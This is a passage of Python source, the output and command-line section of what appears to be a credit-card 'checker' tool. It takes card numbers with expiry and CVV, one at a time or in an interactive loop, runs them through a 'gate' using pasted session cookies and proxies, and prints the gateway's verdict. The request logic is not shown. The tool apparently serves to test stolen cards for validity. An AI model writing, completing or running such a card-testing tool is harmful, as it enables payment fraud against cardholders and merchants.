        # Human-readable gateway message -> shown in the gate's Rᴀᴡ field.
        "response":   result.message or "Unknown",
        "message":    result.message or "Unknown",
        "raw":        result.raw,
        "elapsed":    result.elapsed or round(time.time() - started, 2),
        "proxy":      result.proxy,
        "profile":    result.profile,
    }


# ============================================================================
#  CLI
# ============================================================================

def _prompt_card() -> Optional[Card]:
    try:
        raw = input("card > ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return None
    if not raw:
        return None
    try:
        return Card.parse(raw)
    except ValueError as exc:
        print(f"invalid: {exc}", file=sys.stderr)
        return None


def _emit(res: CheckResult) -> None:
    print(json.dumps(res.to_dict(), indent=2, ensure_ascii=False))


def main() -> int:
    parser = argparse.ArgumentParser(add_help=True)
    parser.add_argument("card", nargs="?", default=None,
                        help="NUMBER|MM|YY|CVV (omit for interactive mode)")
    args = parser.parse_args()

    if not COOKIES:
        _emit(CheckResult(
            "error",
            "no auth cookies found — paste them into PASTE_COOKIES_HERE",
            "", 0.0,
        ))
        return 2

    if args.card:
        try:
            card = Card.parse(args.card)
        except ValueError as exc:
            print(json.dumps({"status": "error", "message": str(exc),
                              "raw": "", "elapsed": 0.0}, indent=2))
            return 2
        _emit(Checker(COOKIES).run(card))
        return 0

    while True:
        card = _prompt_card()
        if card is None:
            return 0
        _emit(Checker(COOKIES).run(card))


if __name__ == "__main__":
    raise SystemExit(main())